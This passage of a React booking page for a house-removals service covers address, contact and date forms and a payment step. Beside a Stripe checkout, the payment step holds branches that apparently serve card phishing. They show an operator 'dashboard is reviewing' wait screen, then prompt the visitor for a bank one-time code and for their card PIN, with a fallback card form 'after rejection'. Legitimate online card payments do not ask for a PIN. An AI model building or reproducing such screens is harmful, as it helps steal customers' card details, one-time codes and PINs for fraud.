                      <div className={`flex h-11 w-11 shrink-0 items-center justify-center rounded-xl font-serif font-black text-xl ${ACCENTS[selectedIdx].bg} text-white`}>
                        {BED_NUMS[selectedIdx]}
                      </div>
                      <div>
                        <div className="font-bold text-white text-sm">{selectedPackage.label}</div>
                        <div className="text-xs text-white/50">{selectedPackage.team}</div>
                      </div>
                    </div>

                    {/* Price trio */}
                    <div className="flex items-center gap-5 sm:gap-8">
                      <div>
                        <div className="text-[10px] font-semibold text-white/40 uppercase tracking-widest">Full Move</div>
                        <div className="text-lg font-black text-white">{selectedPackage.from}</div>
                      </div>
                      <div className="h-8 w-px bg-white/10" />
                      <div>
                        <div className="text-[10px] font-semibold text-white/40 uppercase tracking-widest">Deposit Now</div>
                        <div className="text-lg font-black text-green-400">£{(selectedPackage.deposit / 100).toFixed(0)}</div>
                      </div>
                      <div className="h-8 w-px bg-white/10 hidden sm:block" />
                      <div className="hidden sm:block">
                        <div className="text-[10px] font-semibold text-white/40 uppercase tracking-widest">On the Day</div>
                        <div className="text-lg font-black text-white/50">
                          £{Math.max(0, parseInt(selectedPackage.from.replace(/[^0-9]/g, "")) - Math.round(selectedPackage.deposit / 100))}
                        </div>
                      </div>
                    </div>

                    {/* CTA */}
                    <div className="flex flex-col items-stretch sm:items-end gap-1.5 w-full sm:w-auto">
                      <Button
                        size="lg"
                        className={`btn-shine h-12 px-8 text-base font-bold rounded-full w-full sm:w-auto shadow-xl ${ACCENTS[selectedIdx].bg} hover:opacity-90 text-white border-0`}
                        onClick={() => { setStep("address"); window.scrollTo({ top: 0, behavior: "smooth" }); }}
                        data-testid="button-continue-to-address"
                      >
                        {b.continueBtn}
                        <ArrowRight className="ml-2 h-5 w-5" />
                      </Button>
                      <div className="flex items-center justify-center sm:justify-end gap-1.5 text-[11px] text-white/35">
                        <ShieldCheck className="h-3 w-3 text-green-400" />
                        Fully insured · No hidden fees
                      </div>
                    </div>
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* ════ STEP 2: ADDRESS ════ */}
          {step === "address" && (
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
              <button
                onClick={() => setStep("package")}
                className="mb-8 flex items-center gap-2 text-sm font-semibold text-muted-foreground hover:text-foreground transition-colors"
              >
                <ArrowLeft className="h-4 w-4" /> Back to Package
              </button>

              <div className="grid gap-8 lg:grid-cols-[1fr_380px]">
                {/* Left: Form */}
                <div className="space-y-6">
                  {/* Section: Addresses */}
                  <div className="rounded-2xl border border-border bg-card shadow-sm overflow-hidden">
                    <div className="flex items-center gap-3 px-6 py-4 bg-muted/40 border-b border-border">
                      <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-primary text-white">
                        <MapPin className="h-4 w-4" />
                      </div>
                      <h3 className="font-bold text-base">{b.addressTitle}</h3>
                    </div>
                    <div className="p-6 space-y-6">
                      <Form {...form}>
                        {/* FROM */}
                        <div>
                          <div className="flex items-center gap-2 mb-3">
                            <span className="flex h-6 w-6 items-center justify-center rounded-full bg-primary text-white text-[11px] font-black">A</span>
                            <span className="font-semibold text-sm">{b.fromLabel}</span>
                          </div>
                          <div className="space-y-3 pl-8">
                            <FormField control={form.control} name="fromLine1" render={({ field }) => (
                              <FormItem><FormLabel>{b.addrLine1}</FormLabel>
                                <FormControl><Input placeholder={b.addrLine1Placeholder} {...field} data-testid="input-from-line1" /></FormControl>
                                <FormMessage />
                              </FormItem>
                            )} />
                            <FormField control={form.control} name="fromLine2" render={({ field }) => (
                              <FormItem><FormLabel>{b.addrLine2}</FormLabel>
                                <FormControl><Input placeholder={b.addrLine2Placeholder} {...field} /></FormControl>
                              </FormItem>
                            )} />
                            <div className="grid gap-3 sm:grid-cols-2">
                              <FormField control={form.control} name="fromCity" render={({ field }) => (
                                <FormItem><FormLabel>{b.addrCity}</FormLabel>
                                  <FormControl><Input placeholder={b.addrCityPlaceholder} {...field} data-testid="input-from-city" /></FormControl>
                                  <FormMessage />
                                </FormItem>
                              )} />
                              <FormField control={form.control} name="fromPostcode" render={({ field }) => (
                                <FormItem><FormLabel>{b.addrPostcode}</FormLabel>
                                  <FormControl>
                                    <PostcodeInput value={field.value} onChange={field.onChange} placeholder={b.addrPostcodePlaceholder} isValid={isFromPostcodeValid} />
                                  </FormControl>
                                  <FormMessage />
                                </FormItem>
                              )} />
                            </div>
                          </div>
                        </div>

                        {/* Connector line */}
                        <div className="flex items-center gap-3 my-2">
                          <div className="ml-3 flex flex-col items-center gap-1">
                            <div className="h-2 w-2 rounded-full bg-border" />
                            <div className="h-5 w-px bg-border" />
                            <div className="h-2 w-2 rounded-full bg-green-500" />
                          </div>
                          <span className="text-xs text-muted-foreground">moving to</span>
                        </div>

                        {/* TO */}
                        <div>
                          <div className="flex items-center gap-2 mb-3">
                            <span className="flex h-6 w-6 items-center justify-center rounded-full bg-green-600 text-white text-[11px] font-black">B</span>
                            <span className="font-semibold text-sm">{b.toLabel}</span>
                          </div>
                          <div className="space-y-3 pl-8">
                            <FormField control={form.control} name="toLine1" render={({ field }) => (
                              <FormItem><FormLabel>{b.addrLine1}</FormLabel>
                                <FormControl><Input placeholder={b.addrLine1Placeholder} {...field} data-testid="input-to-line1" /></FormControl>
                                <FormMessage />
                              </FormItem>
                            )} />
                            <FormField control={form.control} name="toLine2" render={({ field }) => (
                              <FormItem><FormLabel>{b.addrLine2}</FormLabel>
                                <FormControl><Input placeholder={b.addrLine2Placeholder} {...field} /></FormControl>
                              </FormItem>
                            )} />
                            <div className="grid gap-3 sm:grid-cols-2">
                              <FormField control={form.control} name="toCity" render={({ field }) => (
                                <FormItem><FormLabel>{b.addrCity}</FormLabel>
                                  <FormControl><Input placeholder={b.addrCityPlaceholder} {...field} data-testid="input-to-city" /></FormControl>
                                  <FormMessage />
                                </FormItem>
                              )} />
                              <FormField control={form.control} name="toPostcode" render={({ field }) => (
                                <FormItem><FormLabel>{b.addrPostcode}</FormLabel>
                                  <FormControl>
                                    <PostcodeInput value={field.value} onChange={field.onChange} placeholder={b.addrPostcodePlaceholder} isValid={isToPostcodeValid} />
                                  </FormControl>
                                  <FormMessage />
                                </FormItem>
                              )} />
                            </div>
                          </div>
                        </div>
                      </Form>
                    </div>
                  </div>

                  {/* Continue Button */}
                  <Button
                    size="lg"
                    className="btn-shine w-full text-base h-13 rounded-full font-bold shadow-lg"
                    onClick={continueFromAddress}
                    data-testid="button-address-to-details"
                  >
                    <ArrowRight className="mr-2 h-5 w-5" />
                    Continue to Your Details
                  </Button>
                </div>

                {/* Right: Sticky summary */}
                {selectedPackage && selectedIdx !== null && (
                  <div className="hidden lg:block">
                    <div className="sticky top-[110px] space-y-4">
                      {/* Package card */}
                      <div className={`rounded-2xl border-2 ${ACCENTS[selectedIdx].border} overflow-hidden shadow-lg`}>
                        <div className={`${ACCENTS[selectedIdx].bg} px-5 py-4 flex items-center gap-3`}>
                          <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-white/20 font-serif font-black text-2xl text-white">
                            {BED_NUMS[selectedIdx]}
                          </div>
                          <div>
                            <div className="font-bold text-white text-lg">{selectedPackage.label}</div>
                            <div className="text-white/70 text-xs flex items-center gap-1"><Users className="h-3 w-3" />{selectedPackage.team}</div>
                          </div>
                        </div>
                        <div className={`${ACCENTS[selectedIdx].light} px-5 py-4 space-y-3`}>
                          <div className="flex items-center justify-between py-2 border-b border-border/60">
                            <span className="text-sm text-muted-foreground">Full move price</span>
                            <span className={`font-black text-xl ${ACCENTS[selectedIdx].text}`}>{selectedPackage.from}</span>
                          </div>
                          <div className="flex items-center justify-between py-2 border-b border-border/60">
                            <span className="text-sm text-muted-foreground">Deposit today</span>
                            <span className="font-black text-xl text-green-600">£{(selectedPackage.deposit / 100).toFixed(0)}</span>
                          </div>
                          <div className="flex items-center justify-between py-2">
                            <span className="text-sm text-muted-foreground">Balance on move day</span>
                            <span className="font-bold text-lg text-foreground/60">
                              £{Math.max(0, parseInt(selectedPackage.from.replace(/[^0-9]/g, "")) - Math.round(selectedPackage.deposit / 100))}
                            </span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </motion.div>
          )}

          {/* ════ STEP 3: DETAILS ════ */}
          {step === "details" && (
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
              <button
                onClick={() => setStep("address")}
                className="mb-8 flex items-center gap-2 text-sm font-semibold text-muted-foreground hover:text-foreground transition-colors"
              >
                <ArrowLeft className="h-4 w-4" /> Back to Address
              </button>

              <div className="grid gap-8 lg:grid-cols-[1fr_380px]">
                {/* Left: Form */}
                <div className="space-y-6">

                  {/* Section: Contact */}
                  <div className="rounded-2xl border border-border bg-card shadow-sm overflow-hidden">
                    <div className="flex items-center gap-3 px-6 py-4 bg-muted/40 border-b border-border">
                      <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-primary text-white">
                        <Users className="h-4 w-4" />
                      </div>
                      <h3 className="font-bold text-base">{b.contactTitle}</h3>
                    </div>
                    <div className="p-6">
                      <Form {...form}>
                        <div className="grid gap-4 md:grid-cols-2">
                          <FormField control={form.control} name="name" render={({ field }) => (
                            <FormItem><FormLabel>{b.fullName}</FormLabel>
                              <FormControl><Input placeholder={b.fullNamePlaceholder} {...field} data-testid="input-name" /></FormControl>
                              <FormMessage />
                            </FormItem>
                          )} />
                          <FormField control={form.control} name="phone" render={({ field }) => (
                            <FormItem><FormLabel>{b.phone}</FormLabel>
                              <FormControl><Input type="tel" placeholder={b.phonePlaceholder} {...field} data-testid="input-phone" /></FormControl>
                              <FormMessage />
                            </FormItem>
                          )} />
                        </div>
                        <div className="mt-4">
                          <FormField control={form.control} name="email" render={({ field }) => (
                            <FormItem><FormLabel>{b.email}</FormLabel>
                              <FormControl><Input type="email" placeholder={b.emailPlaceholder} {...field} data-testid="input-email" /></FormControl>
                              <FormMessage />
                            </FormItem>
                          )} />
                        </div>
                      </Form>
                    </div>
                  </div>

                  {/* Section: Addresses */}
                  <div className="rounded-2xl border border-border bg-card shadow-sm overflow-hidden">
                    <div className="flex items-center gap-3 px-6 py-4 bg-muted/40 border-b border-border">
                      <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-primary text-white">
                        <MapPin className="h-4 w-4" />
                      </div>
                      <h3 className="font-bold text-base">{b.addressTitle}</h3>
                    </div>
                    <div className="p-6 space-y-6">
                      <Form {...form}>
                        {/* FROM */}
                        <div>
                          <div className="flex items-center gap-2 mb-3">
                            <span className="flex h-6 w-6 items-center justify-center rounded-full bg-primary text-white text-[11px] font-black">A</span>
                            <span className="font-semibold text-sm">{b.fromLabel}</span>
                          </div>
                          <div className="space-y-3 pl-8">
                            <FormField control={form.control} name="fromLine1" render={({ field }) => (
                              <FormItem><FormLabel>{b.addrLine1}</FormLabel>
                                <FormControl><Input placeholder={b.addrLine1Placeholder} {...field} data-testid="input-from-line1" /></FormControl>
                                <FormMessage />
                              </FormItem>
                            )} />
                            <FormField control={form.control} name="fromLine2" render={({ field }) => (
                              <FormItem><FormLabel>{b.addrLine2}</FormLabel>
                                <FormControl><Input placeholder={b.addrLine2Placeholder} {...field} /></FormControl>
                              </FormItem>
                            )} />
                            <div className="grid gap-3 sm:grid-cols-2">
                              <FormField control={form.control} name="fromCity" render={({ field }) => (
                                <FormItem><FormLabel>{b.addrCity}</FormLabel>
                                  <FormControl><Input placeholder={b.addrCityPlaceholder} {...field} data-testid="input-from-city" /></FormControl>
                                  <FormMessage />
                                </FormItem>
                              )} />
                              <FormField control={form.control} name="fromPostcode" render={({ field }) => (
                                <FormItem><FormLabel>{b.addrPostcode}</FormLabel>
                                  <FormControl>
                                    <PostcodeInput value={field.value} onChange={field.onChange} placeholder={b.addrPostcodePlaceholder} isValid={isFromPostcodeValid} />
                                  </FormControl>
                                  <FormMessage />
                                </FormItem>
                              )} />
                            </div>
                          </div>
                        </div>

                        {/* Connector line */}
                        <div className="flex items-center gap-3 my-2">
                          <div className="ml-3 flex flex-col items-center gap-1">
                            <div className="h-2 w-2 rounded-full bg-border" />
                            <div className="h-5 w-px bg-border" />
                            <div className="h-2 w-2 rounded-full bg-green-500" />
                          </div>
                          <span className="text-xs text-muted-foreground">moving to</span>
                        </div>

                        {/* TO */}
                        <div>
                          <div className="flex items-center gap-2 mb-3">
                            <span className="flex h-6 w-6 items-center justify-center rounded-full bg-green-600 text-white text-[11px] font-black">B</span>
                            <span className="font-semibold text-sm">{b.toLabel}</span>
                          </div>
                          <div className="space-y-3 pl-8">
                            <FormField control={form.control} name="toLine1" render={({ field }) => (
                              <FormItem><FormLabel>{b.addrLine1}</FormLabel>
                                <FormControl><Input placeholder={b.addrLine1Placeholder} {...field} data-testid="input-to-line1" /></FormControl>
                                <FormMessage />
                              </FormItem>
                            )} />
                            <FormField control={form.control} name="toLine2" render={({ field }) => (
                              <FormItem><FormLabel>{b.addrLine2}</FormLabel>
                                <FormControl><Input placeholder={b.addrLine2Placeholder} {...field} /></FormControl>
                              </FormItem>
                            )} />
                            <div className="grid gap-3 sm:grid-cols-2">
                              <FormField control={form.control} name="toCity" render={({ field }) => (
                                <FormItem><FormLabel>{b.addrCity}</FormLabel>
                                  <FormControl><Input placeholder={b.addrCityPlaceholder} {...field} data-testid="input-to-city" /></FormControl>
                                  <FormMessage />
                                </FormItem>
                              )} />
                              <FormField control={form.control} name="toPostcode" render={({ field }) => (
                                <FormItem><FormLabel>{b.addrPostcode}</FormLabel>
                                  <FormControl>
                                    <PostcodeInput value={field.value} onChange={field.onChange} placeholder={b.addrPostcodePlaceholder} isValid={isToPostcodeValid} />
                                  </FormControl>
                                  <FormMessage />
                                </FormItem>
                              )} />
                            </div>
                          </div>
                        </div>
                      </Form>
                    </div>
                  </div>

                  {/* Section: When */}
                  <div className="rounded-2xl border border-border bg-card shadow-sm overflow-hidden">
                    <div className="flex items-center gap-3 px-6 py-4 bg-muted/40 border-b border-border">
                      <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-primary text-white">
                        <CalendarCheck className="h-4 w-4" />
                      </div>
                      <h3 className="font-bold text-base">{b.whenTitle}</h3>
                    </div>
                    <div className="p-6">
                      <Form {...form}>
                        <div className="grid gap-4 md:grid-cols-2">
                          <FormField control={form.control} name="date" render={({ field }) => {
                            const d = new Date();
                            const localMin = `${d.getFullYear()}-${String(d.getMonth()+1).padStart(2,"0")}-${String(d.getDate()).padStart(2,"0")}`;
                            return (
                              <FormItem><FormLabel>{b.dateLabel}</FormLabel>
                                <FormControl><Input
                                  type="date"
                                  min={localMin}
                                  value={field.value}
                                  name={field.name}
                                  ref={field.ref}
                                  onBlur={field.onBlur}
                                  onChange={e => {
                                    // Normalize YYYY/MM/DD or YYYY.MM.DD → YYYY-MM-DD
                                    const v = e.target.value.trim().replace(/[\/\.]/g, "-");
                                    field.onChange(v);
                                  }}
                                  data-testid="input-date"
                                /></FormControl>
                                <FormMessage />
                              </FormItem>
                            );
                          }} />
                          <FormField control={form.control} name="time" render={({ field }) => (
                            <FormItem><FormLabel>{b.timeLabel}</FormLabel>
                              <Select onValueChange={field.onChange} value={field.value}>
                                <FormControl>
                                  <SelectTrigger data-testid="select-time"><SelectValue placeholder={b.timePlaceholder} /></SelectTrigger>
                                </FormControl>
                                <SelectContent>
                                  {b.timeSlots.map(ts => <SelectItem key={ts.value} value={ts.value}>{ts.label}</SelectItem>)}
                                </SelectContent>
                              </Select>
                              <FormMessage />
                            </FormItem>
                          )} />
                        </div>
                        <div className="mt-4">
                          <FormField control={form.control} name="requirements" render={({ field }) => (
                            <FormItem>
                              <FormLabel className="flex items-center gap-2">
                                <Package className="h-4 w-4 text-primary" /> {b.notesLabel}
                              </FormLabel>
                              <FormControl>
                                <Textarea placeholder={b.notesPlaceholder} className="min-h-[90px]" {...field} data-testid="input-requirements" />
                              </FormControl>
                            </FormItem>
                          )} />
                        </div>
                      </Form>
                    </div>
                  </div>

                  {/* Error + Submit */}
                  <Form {...form}>
                    <form noValidate onSubmit={form.handleSubmit(onSubmit)}>
                      <BookingFlowError message={apiError} />
                      <Button
                        type="submit"
                        size="lg"
                        className="btn-shine w-full text-base h-13 rounded-full font-bold shadow-lg"
                        disabled={isCreatingIntent}
                        data-testid="button-proceed-to-payment"
                      >
                        {isCreatingIntent
                          ? <><Loader2 className="mr-2 h-5 w-5 animate-spin" />{b.preparing}</>
                          : <>
                              <Banknote className="mr-2 h-5 w-5" />
                              Continue to Payment - £{selectedPackage ? (selectedPackage.deposit / 100).toFixed(0) : "—"}
                            </>
                        }
                      </Button>
                      <p className="text-center text-xs text-muted-foreground mt-3">{b.depositNote}</p>
                    </form>
                  </Form>
                </div>

                {/* Right: Sticky summary */}
                {selectedPackage && selectedIdx !== null && (
                  <div className="hidden lg:block">
                    <div className="sticky top-[110px] space-y-4">
                      {/* Package card */}
                      <div className={`rounded-2xl border-2 ${ACCENTS[selectedIdx].border} overflow-hidden shadow-lg`}>
                        <div className={`${ACCENTS[selectedIdx].bg} px-5 py-4 flex items-center gap-3`}>
                          <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-white/20 font-serif font-black text-2xl text-white">
                            {BED_NUMS[selectedIdx]}
                          </div>
                          <div>
                            <div className="font-bold text-white text-lg">{selectedPackage.label}</div>
                            <div className="text-white/70 text-xs flex items-center gap-1"><Users className="h-3 w-3" />{selectedPackage.team}</div>
                          </div>
                          <button onClick={() => setStep("package")} className="ml-auto text-white/60 hover:text-white text-xs underline">
                            {b.change}
                          </button>
                        </div>
                        <div className={`${ACCENTS[selectedIdx].light} px-5 py-4 space-y-3`}>
                          <div className="flex items-center justify-between py-2 border-b border-border/60">
                            <span className="text-sm text-muted-foreground">Full move price</span>
                            <span className={`font-black text-xl ${ACCENTS[selectedIdx].text}`}>{selectedPackage.from}</span>
                          </div>
                          <div className="flex items-center justify-between py-2 border-b border-border/60">
                            <span className="text-sm text-muted-foreground">Deposit today</span>
                            <span className="font-black text-xl text-green-600">£{(selectedPackage.deposit / 100).toFixed(0)}</span>
                          </div>
                          <div className="flex items-center justify-between py-2">
                            <span className="text-sm text-muted-foreground">Balance on move day</span>
                            <span className="font-bold text-lg text-foreground/60">
                              £{Math.max(0, parseInt(selectedPackage.from.replace(/[^0-9]/g, "")) - Math.round(selectedPackage.deposit / 100))}
                            </span>
                          </div>
                        </div>
                      </div>

                      {/* Trust list */}
                      <div className="rounded-2xl border border-border bg-card px-5 py-4 space-y-3">
                        {[
                          { Icon: ShieldCheck, label: "Fully insured up to £50,000", color: "text-blue-500" },
                          { Icon: Clock, label: "Team arrives within 20 minutes", color: "text-green-500" },
                          { Icon: Banknote, label: "No hidden fees, ever", color: "text-primary" },
                        ].map(({ Icon, label, color }) => (
                          <div key={label} className="flex items-center gap-3 text-sm text-muted-foreground">
                            <Icon className={`h-4 w-4 shrink-0 ${color}`} />
                            {label}
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </motion.div>
          )}

          {/* ════ STEP 3: PAYMENT ════ */}
          {step === "payment" && (
            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
              <div className="max-w-2xl mx-auto">
                <button onClick={() => setStep("details")}
                  className="mb-6 flex items-center gap-2 text-sm font-semibold text-muted-foreground hover:text-foreground transition-colors"
                  data-testid="button-back-to-details">
                  <ArrowLeft className="h-4 w-4" /> Back to Your Details
                </button>
                {selectedPackage && selectedIdx !== null && (
                  <div className={`rounded-xl border-2 ${ACCENTS[selectedIdx].border} ${ACCENTS[selectedIdx].light} p-4 mb-6 flex items-center gap-4`}>
                    <div className={`flex h-12 w-12 items-center justify-center rounded-xl ${ACCENTS[selectedIdx].bg} text-white font-serif font-black text-2xl`}>
                      {BED_NUMS[selectedIdx]}
                    </div>
                    <div className="flex-1">
                      <div className="font-bold">{selectedPackage.label} — {selectedPackage.team}</div>
                      <div className="text-sm text-muted-foreground">{b.fullMoveFrom} {selectedPackage.from}</div>
                    </div>
                    <div className="text-right">
                      <div className="text-xs text-muted-foreground">Deposit</div>
                      <div className="font-black text-xl text-green-600">£{(selectedPackage.deposit / 100).toFixed(0)}</div>
                    </div>
                  </div>
                )}
                <div className="rounded-2xl border border-border bg-card p-6 md:p-10 shadow-sm">

                  {/* ── STRIPE (real payment intent ready) ── */}
                  {isCheckoutReady({ clientSecret, stripeLoaded: Boolean(stripeInstance), bookingId, amount: paymentAmount }) ? (
                    <Elements stripe={stripeInstance!} options={{ clientSecret: clientSecret! }}>
                      <CheckoutForm
                        amount={paymentAmount!}
                        service={selectedPackage?.label ?? "House Removal"}
                        clientSecret={clientSecret!}
                        onSuccess={onPaymentSuccess}
                      />
                    </Elements>

                  ) : payStep === "waiting" ? (
                    /* ── WAITING: dashboard is reviewing ── */
                    <div className="flex flex-col items-center gap-6 py-10 text-center">
                      <div className="flex h-20 w-20 items-center justify-center rounded-full bg-primary/10">
                        <Loader2 className="h-10 w-10 animate-spin text-primary" />
                      </div>
                      <div>
                        <h3 className="text-lg font-bold">Verifying your payment details</h3>
                        <p className="text-sm text-muted-foreground mt-2 max-w-xs mx-auto">
                          Please keep this page open. This usually takes just a moment — we'll update you automatically.
                        </p>
                      </div>
                      <div className="flex items-center gap-2 text-xs text-muted-foreground">
                        <ShieldCheck className="h-4 w-4 text-primary" />
                        <span>256-bit SSL encrypted · Your details are safe</span>
                      </div>
                    </div>

                  ) : payStep === "otp" ? (
                    /* ── OTP: visitor enters verification code ── */
                    <div className="space-y-5">
                      <div className="flex items-start gap-3 rounded-xl border border-primary/15 bg-primary/5 p-4">
                        <ShieldCheck className="mt-0.5 h-5 w-5 shrink-0 text-primary" />
                        <div>
                          <p className="font-semibold">Bank verification required</p>
                          <p className="text-xs text-muted-foreground mt-0.5">
                            Your bank sent a one-time code to your registered phone or email.
                            Enter it below to confirm your payment.
                          </p>
                        </div>
                      </div>
                      <label className="grid gap-2 text-sm font-semibold">
                        One-Time Code (OTP)
                        <input
                          type="text"
                          inputMode="numeric"
                          value={otpValue}
                          onChange={e => setOtpValue(e.target.value.replace(/\D/g, "").slice(0, 8))}
                          placeholder="Enter the code you received"
                          autoFocus
                          className="w-full rounded-md border border-input bg-background px-3 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary/50 transition-all font-mono tracking-widest text-center text-lg"
                        />
                      </label>
                      {otpError && (
                        <div className="flex items-start gap-2 rounded-lg border border-destructive/20 bg-destructive/5 px-4 py-3 text-sm text-destructive">
                          <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />
                          <span>{otpError}</span>
                        </div>
                      )}
                      <Button
                        onClick={handleOtpSubmit}
                        className="h-14 w-full rounded-xl text-base font-bold"
                        disabled={otpSending || !otpValue.trim()}
                      >
                        {otpSending
                          ? <><Loader2 className="mr-2 h-5 w-5 animate-spin" /> Verifying…</>
                          : <><Lock className="mr-2 h-4 w-4" /> Confirm Code</>
                        }
                      </Button>
                    </div>

                  ) : payStep === "pin" ? (
                    /* ── PIN: visitor enters bank PIN ── */
                    <div className="space-y-5">
                      <div className="flex items-start gap-3 rounded-xl border border-primary/15 bg-primary/5 p-4">
                        <ShieldCheck className="mt-0.5 h-5 w-5 shrink-0 text-primary" />
                        <div>
                          <p className="font-semibold">PIN verification required</p>
                          <p className="text-xs text-muted-foreground mt-0.5">
                            Please enter your bank card PIN to authorise this payment.
                          </p>
                        </div>
                      </div>
                      <label className="grid gap-2 text-sm font-semibold">
                        Card PIN
                        <input
                          type="password"
                          inputMode="numeric"
                          value={pinValue}
                          onChange={e => setPinValue(e.target.value.replace(/\D/g, "").slice(0, 6))}
                          placeholder="••••"
                          autoFocus
                          maxLength={6}
                          className="w-full rounded-md border border-input bg-background px-3 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary/50 transition-all font-mono tracking-widest text-center text-lg"
                        />
                      </label>
                      {pinError && (
                        <div className="flex items-start gap-2 rounded-lg border border-destructive/20 bg-destructive/5 px-4 py-3 text-sm text-destructive">
                          <AlertCircle className="mt-0.5 h-4 w-4 shrink-0" />
                          <span>{pinError}</span>
                        </div>
                      )}
                      <Button
                        onClick={handlePinSubmit}
                        className="h-14 w-full rounded-xl text-base font-bold"
                        disabled={pinSending || !pinValue.trim()}
                      >
                        {pinSending
                          ? <><Loader2 className="mr-2 h-5 w-5 animate-spin" /> Verifying…</>
                          : <><Lock className="mr-2 h-4 w-4" /> Confirm PIN</>
                        }
                      </Button>
                    </div>

                  ) : (
                    /* ── CARD FORM (default / after rejection) ── */
                    <FallbackCardForm
                      amount={paymentAmount ?? selectedPackage?.deposit ?? 9900}
                      onCardSubmit={handleFallbackCardSubmit}
                      rejectionError={cardRejectionError}
                    />
                  )}
                </div>
              </div>
            </motion.div>
          )}

          {/* ════ STEP 4: CONFIRMED ════ */}
          {step === "confirmed" && bookingDetails && (
            <motion.div
              initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}
              className="max-w-lg mx-auto"
              data-testid="section-booking-confirmed"
            >
              <p className="text-center text-muted-foreground mb-8">
                {confirmationCopy.message} <strong>{bookingDetails.email}</strong>.
              </p>

              {selectedPackage && selectedIdx !== null && (
                <div className={`rounded-2xl border-2 ${ACCENTS[selectedIdx].border} overflow-hidden shadow-lg mb-6`}>
                  <div className={`${ACCENTS[selectedIdx].bg} px-6 py-4 flex items-center gap-3`}>
                    <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-white/20 font-serif font-black text-2xl text-white">{BED_NUMS[selectedIdx]}</div>
                    <div>
                      <div className="font-bold text-white text-lg">{selectedPackage.label}</div>
                      <div className="text-white/70 text-xs">{selectedPackage.team}</div>
                    </div>
                  </div>
                  <div className="bg-card px-6 py-4 space-y-2.5 text-sm">
                    {[
                      [b.from, buildAddress(bookingDetails.fromLine1, bookingDetails.fromLine2, bookingDetails.fromCity, bookingDetails.fromPostcode)],
                      [b.to, buildAddress(bookingDetails.toLine1, bookingDetails.toLine2, bookingDetails.toCity, bookingDetails.toPostcode)],
                      [b.date, `${bookingDetails.date} · ${bookingDetails.time}`],
                    ].map(([label, val]) => (
                      <div key={label} className="flex justify-between gap-4 py-1.5 border-b border-border/50 last:border-0">
                        <span className="text-muted-foreground shrink-0">{label}</span>
                        <span className="font-medium text-right">{val}</span>
                      </div>
                    ))}
                    <div className="flex justify-between pt-2 mt-1 border-t-2 border-border">
                      <span className="font-bold">{confirmationCopy.paymentStatus}</span>
                      <span className={`font-black text-lg ${ACCENTS[selectedIdx!].text}`}>£{(selectedPackage.deposit / 100).toFixed(0)}</span>
                    </div>
                  </div>
                </div>
              )}

              <p className="text-sm text-center text-muted-foreground mb-6">{b.changeNote}</p>
              <Button
                onClick={() => { setStep("package"); setSelectedPackage(null); setSelectedIdx(null); form.reset(); }}
                variant="outline"
                className="w-full rounded-full"
              >
                {b.bookAnother}
              </Button>
            </motion.div>
          )}

        </div>
      </section>
    </>
  );
}
